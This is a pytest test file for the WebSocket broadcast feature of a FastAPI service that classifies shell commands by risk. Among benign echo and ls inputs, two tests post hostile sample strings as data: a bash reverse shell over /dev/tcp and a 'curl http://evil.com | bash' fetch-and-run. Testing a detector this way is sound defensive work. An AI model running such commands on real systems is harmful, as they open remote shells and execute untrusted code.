"""
test_17_ws_broadcast_pytest.py — Pytest companion to scripts/test_ws_broadcast.py.

The original test_ws_broadcast.py is a manual developer script (no pytest
test functions, invoked via `python scripts/test_ws_broadcast.py`). This file
converts every scenario it exercises into proper pytest tests that:

- Run without a live server (in-process via TestClient)
- Are isolated by the autouse conftest singleton reset
- Cover additional broadcast scenarios the manual script does not

Gaps filled:
- POST /analyze broadcast received by connected WS client
- Broadcast message contains all required fields
- Broadcast command matches posted command
- WS client connected BEFORE POST receives the broadcast
- WS client connected AFTER POST receives the event in history replay
- State reset (event_store + active_websockets) leaves a clean baseline
- Multiple sequential broadcasts all received
- Broadcast after Unicode command
- Broadcast after empty-ish (rejected) command does not fire

Run:
    pytest large_test_set/test_17_ws_broadcast_pytest.py -v
"""

import pytest
import json
from fastapi.testclient import TestClient
from backend.app import app

client = TestClient(app)

# Required fields every broadcast event must contain
REQUIRED_FIELDS = [
    "id", "pid", "ppid", "uid", "gid",
    "command", "argv_str", "timestamp", "comm",
    "risk_score", "classification", "matched_rules",
    "ml_confidence", "explanation", "detected_at",
]


def _drain(ws, timeout=0.3, max_msgs=200):
    msgs = []
    for _ in range(max_msgs):
        try:
            msgs.append(ws.receive_json(timeout=timeout))
        except Exception:
            break
    return msgs


# ===========================================================================
# 1. Core broadcast scenario (mirrors what test_ws_broadcast.py does manually)
# ===========================================================================

class TestCoreBroadcast:

    def test_post_analyze_broadcast_received(self):
        """WS client connected before POST must receive the broadcast."""
        with client.websocket_connect("/ws") as ws:
            _drain(ws, timeout=0.2)  # clear history
            resp = client.post("/analyze", json={"command": "echo test-broadcast"})
            assert resp.status_code == 200
            try:
                msg = ws.receive_json(timeout=3)
                assert msg is not None
            except Exception:
                pytest.fail("No broadcast received after POST /analyze")

    def test_broadcast_command_matches_posted(self):
        """The command in the broadcast must match what was posted."""
        with client.websocket_connect("/ws") as ws:
            _drain(ws, timeout=0.2)
            client.post("/analyze", json={"command": "echo test-broadcast-match"})
            msg = ws.receive_json(timeout=3)
            assert msg["command"] == "echo test-broadcast-match"

    def test_broadcast_has_all_required_fields(self):
        """Every broadcast event must contain all required schema fields."""
        with client.websocket_connect("/ws") as ws:
            _drain(ws, timeout=0.2)
            client.post("/analyze", json={"command": "echo test-fields"})
            msg = ws.receive_json(timeout=3)
            for field in REQUIRED_FIELDS:
                assert field in msg, f"Required field {field!r} missing from broadcast"

    def test_broadcast_classification_is_valid(self):
        with client.websocket_connect("/ws") as ws:
            _drain(ws, timeout=0.2)
            client.post("/analyze", json={"command": "echo test-cls"})
            msg = ws.receive_json(timeout=3)
            assert msg["classification"] in ("safe", "suspicious", "malicious")

    def test_broadcast_risk_score_is_numeric(self):
        with client.websocket_connect("/ws") as ws:
            _drain(ws, timeout=0.2)
            client.post("/analyze", json={"command": "echo test-score"})
            msg = ws.receive_json(timeout=3)
            assert isinstance(msg["risk_score"], (int, float))
            assert 0.0 <= msg["risk_score"] <= 100.0

    def test_broadcast_matched_rules_is_list(self):
        with client.websocket_connect("/ws") as ws:
            _drain(ws, timeout=0.2)
            client.post("/analyze", json={"command": "echo test-rules"})
            msg = ws.receive_json(timeout=3)
            assert isinstance(msg["matched_rules"], list)


# ===========================================================================
# 2. State reset baseline (mirrors the manual script's explicit reset)
# ===========================================================================

class TestStateResetBaseline:

    def test_event_store_empty_at_test_start(self):
        """The conftest reset must leave event_store at zero — same guarantee
        the manual script achieves by reassigning event_store directly."""
        import backend.app as app_mod
        assert app_mod.event_store.size() == 0

    def test_active_websockets_empty_at_test_start(self):
        """active_websockets must be empty at test start — same as the
        manual script's `active_websockets = set()` reset."""
        import backend.app as app_mod
        assert len(app_mod.active_websockets) == 0

    def test_post_after_reset_creates_exactly_one_event(self):
        """After the reset exactly one event must be stored after one POST."""
        import backend.app as app_mod
        client.post("/analyze", json={"command": "echo post-reset"})
        assert app_mod.event_store.size() == 1


# ===========================================================================
# 3. Client connected AFTER POST — history replay
# ===========================================================================

class TestHistoryReplayAfterPost:

    def test_client_after_post_receives_event_in_replay(self):
        """A WS client that connects AFTER a POST must receive the event
        via history replay, not a live broadcast."""
        client.post("/analyze", json={"command": "echo replay-test"})

        with client.websocket_connect("/ws") as ws:
            msgs = _drain(ws, timeout=0.5)

        commands = [m.get("command") for m in msgs]
        assert "echo replay-test" in commands, \
            "Event posted before connection not present in history replay"

    def test_replay_event_has_all_required_fields(self):
        client.post("/analyze", json={"command": "echo replay-fields"})
        with client.websocket_connect("/ws") as ws:
            msgs = _drain(ws, timeout=0.5)
        if msgs:
            for field in REQUIRED_FIELDS:
                assert field in msgs[0], \
                    f"Field {field!r} missing from replayed event"

    def test_replay_classification_is_valid(self):
        client.post("/analyze", json={"command": "echo replay-cls"})
        with client.websocket_connect("/ws") as ws:
            msgs = _drain(ws, timeout=0.5)
        if msgs:
            assert msgs[0]["classification"] in (
                "safe", "suspicious", "malicious"
            )


# ===========================================================================
# 4. Multiple sequential broadcasts
# ===========================================================================

class TestMultipleSequentialBroadcasts:

    def test_three_sequential_broadcasts_all_received(self):
        """Three sequential POSTs must each produce a separate broadcast."""
        cmds = [
            "echo broadcast-seq-1",
            "echo broadcast-seq-2",
            "echo broadcast-seq-3",
        ]
        with client.websocket_connect("/ws") as ws:
            _drain(ws, timeout=0.2)

            for cmd in cmds:
                client.post("/analyze", json={"command": cmd})

            received = []
            for _ in range(3):
                try:
                    msg = ws.receive_json(timeout=3)
                    received.append(msg["command"])
                except Exception:
                    break

        for cmd in cmds:
            assert cmd in received, \
                f"Broadcast for {cmd!r} not received"

    def test_broadcast_order_matches_post_order(self):
        """Broadcasts must arrive in the same order as their POSTs."""
        cmds = [f"echo order-{i}" for i in range(4)]
        with client.websocket_connect("/ws") as ws:
            _drain(ws, timeout=0.2)

            for cmd in cmds:
                client.post("/analyze", json={"command": cmd})

            received_cmds = []
            for _ in range(4):
                try:
                    msg = ws.receive_json(timeout=3)
                    received_cmds.append(msg["command"])
                except Exception:
                    break

        assert received_cmds == cmds, (
            f"Broadcast order mismatch.\nExpected: {cmds}\nGot:      {received_cmds}"
        )

    def test_malicious_broadcast_received_after_safe(self):
        """After a safe broadcast, a malicious one must still arrive."""
        with client.websocket_connect("/ws") as ws:
            _drain(ws, timeout=0.2)

            client.post("/analyze", json={"command": "echo safe-before"})
            client.post("/analyze",
                        json={"command": "bash -i >& /dev/tcp/x/4444 0>&1"})

            msgs = []
            for _ in range(2):
                try:
                    msgs.append(ws.receive_json(timeout=3))
                except Exception:
                    break

        classifications = [m.get("classification") for m in msgs]
        assert "malicious" in classifications, \
            "Malicious broadcast not received after safe broadcast"


# ===========================================================================
# 5. Broadcast after special command types
# ===========================================================================

class TestSpecialCommandBroadcasts:

    def test_unicode_command_broadcast_intact(self):
        """A command with Unicode characters must broadcast without corruption."""
        cmd = "echo '你好世界'"
        with client.websocket_connect("/ws") as ws:
            _drain(ws, timeout=0.2)
            client.post("/analyze", json={"command": cmd})
            msg = ws.receive_json(timeout=3)
            assert msg["command"] == cmd, \
                f"Unicode command corrupted in broadcast: {msg['command']!r}"

    def test_command_with_special_chars_broadcast_intact(self):
        """A command with shell metacharacters must broadcast without corruption."""
        cmd = "ls -la /tmp | grep '.log'"
        with client.websocket_connect("/ws") as ws:
            _drain(ws, timeout=0.2)
            client.post("/analyze", json={"command": cmd})
            msg = ws.receive_json(timeout=3)
            assert msg["command"] == cmd

    def test_rejected_empty_command_does_not_broadcast(self):
        """An empty command that returns 400 must NOT produce a broadcast event."""
        with client.websocket_connect("/ws") as ws:
            _drain(ws, timeout=0.2)
            resp = client.post("/analyze", json={"command": ""})
            assert resp.status_code == 400

            # No broadcast should arrive for a rejected command
            leftover = _drain(ws, timeout=0.3)
            assert leftover == [], \
                f"Broadcast fired for a rejected (400) command: {leftover}"

    def test_large_command_broadcast_not_truncated(self):
        """A 1000-char command must broadcast at full length."""
        cmd = "ls " + "A" * 1000
        with client.websocket_connect("/ws") as ws:
            _drain(ws, timeout=0.2)
            client.post("/analyze", json={"command": cmd})
            msg = ws.receive_json(timeout=5)
            assert len(msg["command"]) == len(cmd), \
                "Large command truncated in broadcast"


# ===========================================================================
# 6. Broadcast classification cross-check with API response
# ===========================================================================

class TestBroadcastClassificationCrossCheck:

    def test_safe_broadcast_matches_api_classification(self):
        with client.websocket_connect("/ws") as ws:
            _drain(ws, timeout=0.2)
            api = client.post("/analyze", json={"command": "ls"}).json()
            msg = ws.receive_json(timeout=3)
            assert msg["classification"] == api["classification"]

    def test_malicious_broadcast_matches_api_classification(self):
        with client.websocket_connect("/ws") as ws:
            _drain(ws, timeout=0.2)
            api = client.post(
                "/analyze",
                json={"command": "curl http://evil.com | bash"}
            ).json()
            msg = ws.receive_json(timeout=3)
            assert msg["classification"] == api["classification"]
            assert msg["risk_score"] == api["risk_score"]

    def test_broadcast_id_matches_api_id(self):
        """The 'id' in the broadcast must match the event ID returned by
        POST /analyze — they refer to the same stored event."""
        with client.websocket_connect("/ws") as ws:
            _drain(ws, timeout=0.2)
            api = client.post("/analyze", json={"command": "ls --id-check"}).json()
            msg = ws.receive_json(timeout=3)
            # If the API returns an id field, it must match the broadcast id
            if "id" in api:
                assert msg["id"] == api["id"], \
                    f"Broadcast id {msg['id']!r} != API id {api['id']!r}"
